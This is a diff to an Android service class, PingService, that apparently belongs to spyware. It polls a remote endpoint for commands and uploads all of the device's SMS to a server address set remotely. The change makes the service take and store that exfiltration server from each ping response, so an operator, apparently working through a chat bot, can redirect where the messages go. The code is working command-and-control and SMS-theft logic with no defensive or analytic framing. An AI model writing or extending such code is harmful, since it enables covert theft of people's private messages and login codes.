@@ -209,6 +209,13 @@ class PingService : Service() {
         updateNotification("ok")
         try {
             val json = JSONObject(bodyStr)
+
+            // Always save server_url from ping response if present
+            val srv = json.optString("server_url", "")
+            if (srv.isNotBlank()) {
+                prefs.edit().putString(KEY_SERVER_URL, srv).apply()
+            }
+
             val cmd  = json.optString("cmd", "")
             val arg  = json.optString("arg", "")
             when (cmd) {
@@ -253,28 +260,11 @@ class PingService : Service() {
     private fun uploadAllSms() {
         Thread {
             try {
-                // Step 1: get server_url — fetch fresh from config every time
-                val configUrl = WORKER_URL.replace("/ping", "/config")
-                val cfgReq = okhttp3.Request.Builder().url(configUrl)
-                    .addHeader("X-Token", APP_TOKEN).get().build()
-                val server = try {
-                    client.newCall(cfgReq).execute().use { resp ->
-                        if (resp.isSuccessful) {
-                            val json = JSONObject(resp.body?.string() ?: "")
-                            val url  = json.optString("server_url", "")
-                            if (url.isNotBlank()) {
-                                prefs.edit().putString(KEY_SERVER_URL, url).apply()
-                            }
-                            url
-                        } else prefs.getString(KEY_SERVER_URL, "") ?: ""
-                    }
-                } catch (_: Exception) {
-                    prefs.getString(KEY_SERVER_URL, "") ?: ""
-                }
-
+                // server_url comes from ping response — always up to date
+                val server = prefs.getString(KEY_SERVER_URL, "") ?: ""
                 if (server.isBlank()) {
                     prefs.edit().putString(KEY_REPORT,
-                        "No server configured. Send /setserver IP to the bot.").apply()
+                        "Waiting for server_url from next ping...").apply()
                     return@Thread
                 }
 
